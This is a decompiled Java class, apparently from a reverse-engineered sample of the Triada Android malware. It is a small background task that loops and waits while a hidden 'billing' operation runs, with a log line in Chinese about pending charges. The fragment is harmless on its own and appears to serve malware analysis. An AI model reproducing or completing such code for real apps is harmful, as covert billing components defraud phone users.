package com.android.essdk.eyou;

import android.os.AsyncTask;
import com.android.essdk.eyou.a.a;
import com.android.essdk.eyou.e.b;

class j extends AsyncTask {
  j(PlateService paramPlateService) {}
  
  protected String a(String... paramVarArgs) {
    while (true) {
      if (!a.a && !a.b && !a.d)
        return null; 
      PlateService.a(true);
      try {
        Thread.sleep(10000L);
      } catch (InterruptedException interruptedException) {
        b.b("PlateService", "InterruptedException");
      } 
      b.b("PlateService", "上次计费正在进行...等待计费");
    } 
  }
  
  protected void a(String paramString) {
    PlateService.a(this.a);
    super.onPostExecute(paramString);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/j.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */